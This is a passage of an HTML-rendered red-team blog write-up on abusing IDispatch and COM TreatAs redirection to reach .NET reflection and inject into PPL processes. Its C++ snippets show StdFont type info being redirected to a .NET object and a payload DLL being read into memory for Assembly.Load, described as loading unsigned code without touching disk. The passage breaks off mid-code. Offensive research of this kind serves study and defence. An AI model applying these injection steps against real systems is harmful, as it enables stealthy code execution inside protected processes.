column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#locating-the-containing-type-library"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_ir8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_ir8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">Locating the Containing Type Library</strong></div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Finds which type library ("DLL for COM metadata") contains the base interface.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2v8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Some code<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">COMPtr&lt;ITypeLib&gt; pStdoleTypeLib;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">hr = pBaseTypeInfo-&gt;GetContainingTypeLib(&amp;pStdoleTypeLib, &amp;indexInTypeLib);</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">pStdoleTypeLib</code> will typically point to stdole32.tlb, the system type library containing standard COM definitions like StdFont.</p><h4 id="targeting-stdfont-via-guid" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#targeting-stdfont-via-guid"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_j38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_j38qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">Targeting StdFont via GUID</strong></div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Retrieve type information for CLSID_StdFont (normally a legacy font COM class).</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_378qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Some code<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">COMPtr&lt;ITypeInfo&gt; pStdFontTypeInfo;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">hr = pStdoleTypeLib-&gt;GetTypeInfoOfGuid(CLSID_StdFont, &amp;pStdFontTypeInfo);</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Earlier registry modifications via SetTreatAs redirect this CLSID to a .NET class (CLSID_DotNetObject).</p><h4 id="com-to-.net-object-activation" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#com-to-.net-object-activation"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_jb8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_jb8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">COM-to-.NET Object Activation</div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">CreateInstance activates a .NET System.Object instance through COM, despite targeting CLSID_StdFont. This works due to the TreatAs registry redirection to CLSID_DotNetObject.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_3f8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Some code<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">mscorlib::_ObjectPtr pStdFontObj;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">hr = pStdFontTypeInfo-&gt;CreateInstance(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    nullptr,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    __uuidof(mscorlib::_Object), // Request .NET Object interface<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    reinterpret_cast&lt;void**&gt;(&amp;pStdFontObj)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">mscorlib::_TypePtr pType = pStdFontObj-&gt;GetType();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">pType = pType-&gt;BaseType; // Traverse inheritance hierarchy</span></span></code></pre></div><!--/$--><div class="hint transition-colors rounded-corners:rounded-md circular-corners:rounded-xl overflow-hidden bg-info border-info theme-muted-tint:bg-info-solid/2 [html.sidebar-filled.theme-bold.tint_&amp;]:bg-info-solid/2 text-sm grid grid-cols-[auto_1fr] mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" aria-label="Information" role="note"><div class="py-4 pl-4 text-info-subtle contrast-more:text-info"><svg class="gb-icon size-[1.2em] mt-px leading-normal"><title>circle-info</title><defs><mask id="_R_jh8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/circle-info.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_jh8qav5ukqiv5ubsnpfivb_)"></rect></svg></div><div class="p-4 pl-3 empty:p-0 -row-end-1 -col-end-1 space-y-3 [&amp;_.hint]:border [&amp;_pre]:border [&amp;_pre]:border-neutral"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid text-neutral-strong [&amp;_.can-override-bg]:bg-neutral-active [&amp;_.can-override-text]:text-neutral-strong flip-heading-hash text-start self-start justify-start">The __uuidof(mscorlib::_Object) GUID maps to System.Object in .NET, allowing direct interaction with managed objects. </p></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The _TypePtr interface (from System.Type) enables introspection of .NET types. The code navigates to System.Type itself to prepare for assembly loading.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">At this stage,  CreateInstance method to dynamically create a .NET object. The key part here is the interaction with mscorlib, which is the core .NET assembly. Specifically, you're creating an object corresponding to System.Type, which is the foundation for Reflection in .NET.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By creating this object, I am setting up the environment to load and execute .NET code from memory, rather than from a file on disk.</p><h3 id="loading-.net-assemblies-in-memory" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#loading-.net-assemblies-in-memory"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_jp8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_jp8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Loading .NET Assemblies In-Memory</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The real payload is loaded from a file into memory using reflection. Here's how the assembly is read from the disk and converted into a byte array, which can then be dynamically loaded:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_3t8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Some code<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">std::ifstream file(dllPath, std::ios::binary);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">std::vector&lt;uint8_t&gt; buffer((std::istreambuf_iterator&lt;char&gt;(file)), std::istreambuf_iterator&lt;char&gt;());</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The assembly is converted into a byte array (variant_t), which is then passed to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">System.Reflection.Assembly.Load</code>. This function allows you to dynamically load the .NET assembly from the byte array, which is an effective way to load unsigned code without touching the disk.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_418qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Some code<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">variant_t byteArrayVariant;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">byteArrayVariant.vt = VT_ARRAY | VT_UI1;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">SAFEARRAY* psa = SafeArrayCreateVector(VT_UI1, 0, buffer.size());<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">void* pvData;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">SafeArrayAccessData(psa, &amp;pvData);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">memcpy(pvData, buffer.data(), buffer.size());<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">SafeArrayUnaccessData(psa);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">byteArrayVariant.parray = psa;</span></span></code></pre></div><!--/$--><h4 id="reflection-workflow" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#reflection-workflow"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_k38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_k38qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Reflection Workflow</div></h4><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_458qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">mscorlib::_MethodInfoPtr loadMethod = <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    DotNetInterop::GetStaticMethod(pType, L"Load", 1);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">mscorlib::_AssemblyPtr assembly = <!-- -->
